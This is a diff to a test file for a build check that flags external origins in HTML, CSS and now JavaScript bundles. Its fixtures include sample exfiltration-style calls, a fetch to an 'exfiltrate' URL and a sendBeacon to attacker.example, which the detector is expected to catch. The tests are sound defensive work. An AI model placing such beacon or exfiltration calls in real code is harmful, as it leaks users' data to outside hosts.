@@ -6,6 +6,7 @@ import {
   checkCssText,
   checkDist,
   checkHtmlText,
+  checkJsText,
 } from "../scripts/check-no-external-origin.mjs";
 
 describe("check-no-external-origin.mjs — detection logic", () => {
@@ -52,13 +53,60 @@ describe("check-no-external-origin.mjs — detection logic", () => {
     const css = `.icon { background: url(icons.svg#gear); }`;
     expect(checkCssText(css)).toEqual([]);
   });
+
+  // Round 4 item #2 [MINOR, reviewer finding]: checkDist used to scan only
+  // index.html and *.css, so a real external call bundled into JS passed
+  // silently. checkJsText closes that gap.
+  it("flags a planted external origin in a JS bundle -- the exact gap the reviewer found", () => {
+    const js = 'fetch("https://example.com/exfiltrate").then(r=>r.json())';
+    const findings = checkJsText(js, "index-abc123.js");
+    expect(findings).toHaveLength(1);
+    expect(findings[0]).toContain("https://example.com/exfiltrate");
+    expect(findings[0]).toContain("index-abc123.js");
+  });
+
+  it("flags a planted http:// (not just https://) external origin", () => {
+    const js = 'const u="http://attacker.example/beacon?x=1";sendBeacon(u)';
+    const findings = checkJsText(js);
+    expect(findings).toHaveLength(1);
+    expect(findings[0]).toContain("http://attacker.example/beacon?x=1");
+  });
+
+  it("allows the React error-decoder link (a known inert literal)", () => {
+    const js = '"https://reactjs.org/docs/error-decoder.html?invariant="+e';
+    expect(checkJsText(js)).toEqual([]);
+  });
+
+  it("allows every W3C XML/SVG/MathML/XHTML namespace URI (known inert literals)", () => {
+    const js = [
+      '"http://www.w3.org/2000/svg"',
+      '"http://www.w3.org/1999/xlink"',
+      '"http://www.w3.org/XML/1998/namespace"',
+      '"http://www.w3.org/1999/xhtml"',
+      '"http://www.w3.org/1998/Math/MathML"',
+    ].join(";");
+    expect(checkJsText(js)).toEqual([]);
+  });
+
+  it("does not let the allow-list swallow a real external origin merely hosted near w3.org text", () => {
+    // an attacker-controlled string mentioning "w3.org" in its path/query
+    // must not slip through just because the allow-list pattern is a
+    // prefix match on the wrong anchor -- this one's HOST is attacker.example.
+    const js = '"https://attacker.example/www.w3.org/2000/svg"';
+    const findings = checkJsText(js);
+    expect(findings).toHaveLength(1);
+  });
+
+  it("passes JS with no http(s) literal at all", () => {
+    expect(checkJsText('console.log("hello")')).toEqual([]);
+  });
 });
 
 describe("the actual built dist/ (acceptance criterion #3)", () => {
   const distBuilt = existsSync(join(DIST_DIR, "index.html"));
 
   it.skipIf(!distBuilt)(
-    "references no external origin in index.html or any bundled CSS",
+    "references no external origin in index.html, any bundled CSS, or any bundled JS",
     () => {
       const findings = checkDist();
       expect(findings).toEqual([]);
